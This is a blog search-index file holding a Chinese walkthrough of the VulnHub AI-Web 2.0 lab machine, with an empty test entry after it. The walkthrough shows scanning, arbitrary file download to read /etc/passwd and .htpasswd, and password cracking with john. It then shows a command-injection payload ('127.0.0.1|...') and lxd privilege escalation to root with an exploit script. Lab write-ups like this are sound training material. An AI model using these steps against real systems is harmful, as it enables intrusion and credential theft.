<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>VulnHub靶机AI-Web2.0复现</title>
      <link href="/post/8d8aa195.html"/>
      <url>/post/8d8aa195.html</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub靶机AI-Web2-0复现"><a href="#VulnHub靶机AI-Web2-0复现" class="headerlink" title="VulnHub靶机AI-Web2.0复现"></a>VulnHub靶机AI-Web2.0复现</h1><p><a href="https://download.vulnhub.com/aiweb/AI-Web-2.0.7z">https://download.vulnhub.com/aiweb/AI-Web-2.0.7z</a></p><p>打开靶机即可换kali</p><p><img src="/img/ai1.png"></p><p><img src="/img/ai2.png"></p><p>对内网络段进行信息搜集</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">arp-scan -l</span><br></code></pre></td></tr></table></figure><p><img src="/img/ai3.png"></p><p>只能是这个192.168.71.161的ip了，对他进行一个完整的扫描</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs diff">nmap -sS -sV -T4 -A -p- 192.168.71.161<br><br><span class="hljs-deletion">-sS SYN半开放扫描--&gt;不完整的TCP连接</span><br><span class="hljs-deletion">-sV 版本探测</span><br><span class="hljs-deletion">-T4 扫描速度 从低到高T0到T5</span><br><span class="hljs-deletion">-A 综合扫描包含了</span><br>[-O 操作系统探测,<br><span class="hljs-deletion">-sV 版本探测,</span><br><span class="hljs-deletion">--script=default 脚本扫描,</span><br><span class="hljs-deletion">--traceroute 路由跟踪,</span><br>]<br><span class="hljs-deletion">-p-  1-65535端口</span><br></code></pre></td></tr></table></figure><p><img src="/img/ai4.png"></p><p>疑似有个XuezhuLi的用户，发现有开放80端口和22端口，先给22端口来个最经典的ssh 3次连接</p><p><img src="/img/ai5.png"></p><p>发现不能空密码进行，这里就不去爆破了，一般是ssh端口要么是强密码或者是密钥才能进入，我们去到80网页端口看看</p><p><img src="/img/ai6.png"></p><p>这里我试了sql注入和xss以及弱口令都没货，我们就可以考虑直接换思路，扫下目录了</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dirsearch</span> -u http://192.168.71.161 <br></code></pre></td></tr></table></figure><p><img src="/img/ai7.png"></p><p>这里我看webadmin一堆站点我们就顺藤摸瓜先看看</p><p><img src="/img/ai8.png"></p><p>试试robots.txt</p><p><img src="/img/ai9.png"></p><p>分别进入站点看一下吧</p><p><img src="/img/ai10.png"></p><p><img src="/img/ai11.png"></p><p>这里得到有重要的信息在这个&#x2F;webadmin&#x2F;S0mextras&#x2F;的目录下，并且有个登录框站点，这个登录框同样是无法通过正常漏洞进去后台的</p><p>再通过前面的信息搜集我们利用这个File去sploit看看是否有Nday漏洞</p><p><img src="/img/ai12.png"></p><p>这里的XuezhuLi我们之前就信息搜集到了,我们去历史漏洞网看看有没有相关信息</p><p><img src="/img/ai13.png"></p><p>确实存在两个历史漏洞我们进去看看exp是什么</p><p><img src="/img/ai14.png"></p><p><img src="/img/ai15.png"></p><p>第一个为csrf的漏洞，第二个是任意文件下载的漏洞，我们之前目录扫描的download.php是否能利用到任意文件下载的漏洞呢？</p><p><img src="/img/ai16.png"></p><p>确实可以利用，我们看看里面有什么用户</p><p><img src="/img/ai17.png"></p><p>发现有两个普通用户在这，aiweb2和n0nr00tuser</p><p>后续继续用任意文件下载读取到关键信息&#x2F;etc&#x2F;apache2&#x2F;.htpasswd</p><p><img src="/img/ai18.png"></p><p>得到aiweb2admin加密过的密码</p><p>我们试试john利用kali自带的字典是否可以解密出来</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">vim</span> aiweb2.txt<br></code></pre></td></tr></table></figure><p><img src="/img/ai19.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">john --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt <span class="hljs-regexp">/root/</span>aiweb2.txt<br></code></pre></td></tr></table></figure><p><img src="/img/ai20.png"></p><p>爆出密码 aiweb2admin&#x2F;c.ronaldo，试试能不能在之前的站点直接登录</p><p><img src="/img/ai21.png"></p><p>成功进入，一眼为禁用js然后拼接命令RCE</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>|pwd<br></code></pre></td></tr></table></figure><p><img src="/img/ai22.png"></p><p>直接去之前那个有重要信息的目录下找</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>|ls /var/www/html/webadmin/S0mextras<br></code></pre></td></tr></table></figure><p><img src="/img/ai23.png"></p><p>只有一个文件，不应该，我们使用ls -la看所有隐藏的</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>|ls -al /var/www/html/webadmin/S0mextras<br></code></pre></td></tr></table></figure><p><img src="/img/ai24.png"></p><p>应该是个普通文件，我们使用这条命令去找会更加清楚里面到底有什么</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>|find . -type f /var/www/html/webadmin/S0mextras<br></code></pre></td></tr></table></figure><p><img src="/img/ai25.png"></p><p>访问这个txt看看</p><p><img src="/img/ai26.png"></p><p>这就有了能ssh连接的用户和密码了，我们直接连</p><p><img src="/img/ai26.png"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> n0nr00tuser@<span class="hljs-number">192.168.71.161</span><br></code></pre></td></tr></table></figure><p><img src="/img/ai27.png"></p><p>成功拿到普通用户权限，下一步做下信息搜集想办法继续提权</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">id<br><br>uname -a<br><br>crontab -l<br><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span> 或者 <span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><br></code></pre></td></tr></table></figure><p>一套下来发现没有特别的好的方法，我们利用自动化信息收集试试</p><p>用我们的kali下一个master再下载到靶机中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>codeload.github.com<span class="hljs-regexp">/rebootuser/</span>LinEnum<span class="hljs-regexp">/zip/</span>refs<span class="hljs-regexp">/heads/m</span>aster <br><br>unzip master<br></code></pre></td></tr></table></figure><p><img src="/img/ai28.png"></p><p>kali本机开启http服务，也可在靶机上使用scp下载服务</p><p>两种方法都可以，我这里使用scp下载服务</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">scp root<span class="hljs-variable">@192</span>.<span class="hljs-number">168.71</span>.<span class="hljs-number">133</span><span class="hljs-symbol">:/root/LinEnum-master/LinEnum</span>.sh ./     <br></code></pre></td></tr></table></figure><p><img src="/img/ai29.png"></p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm">./<span class="hljs-type">LinEnum</span>.sh -r re<span class="hljs-keyword">port</span>.txt  直接搜集<br></code></pre></td></tr></table></figure><p><img src="/img/ai30.png"></p><p>提示我们lxd组提权</p><p><img src="/img/ai31.png"></p><p>将shell脚本下载下来</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">searchsploit -m linux/local/46978.sh<br><br>vim 46978.sh<br><br>:<span class="hljs-built_in">set</span> <span class="hljs-attribute">ff</span>=unix  修改成unix的换行符<br></code></pre></td></tr></table></figure><p><img src="/img/ai32.png"></p><p>这个脚本需要配合alpine-v3.20-x86_64-20240802_0530.tar.gz文件才能使用，而这个文件又需要从build-alpine中下载</p><p><img src="/img/ai33.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/saghul/lxd<span class="hljs-literal">-alpine-builder</span>/master/<span class="hljs-built_in">build-alpine</span>    <br><br>chmod a+x <span class="hljs-built_in">build-alpine</span> <br><br> ./<span class="hljs-built_in">build-alpine</span>   kali需要用vpn才行,下载失败就多下几次<br></code></pre></td></tr></table></figure><p><img src="/img/ai34.png"></p><p>换一种方法从kali下载</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">python -m http.<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p><img src="/img/ai35.png"></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata">wget http:<span class="hljs-comment">//192.168.71.133:8000/46978.sh</span><br><br>wget http:<span class="hljs-comment">//192.168.71.133:8000/alpine-v3.20-x86_64-20240802_0530.tar.gz</span><br><br>chmod a+x 46978.<span class="hljs-keyword">sh</span> <br><br>./46978.<span class="hljs-keyword">sh</span> -f alpine-v3.20-x86_64-20240802_0530.tar.gz <br></code></pre></td></tr></table></figure><p><img src="/img/ai36.png"></p><p>成功拿下root权限，后续给自己反弹shell也行，这里我们还要去找一下flag</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> / -name flag*<br><br>cat <span class="hljs-regexp">/mnt/</span>root<span class="hljs-regexp">/root/</span>flag.txt<br></code></pre></td></tr></table></figure><p><img src="/img/ai37.png"></p><p><img src="/img/ai38.png"></p><p>结束</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>测试</title>
      <link href="/post/9daba997.html"/>
      <url>/post/9daba997.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
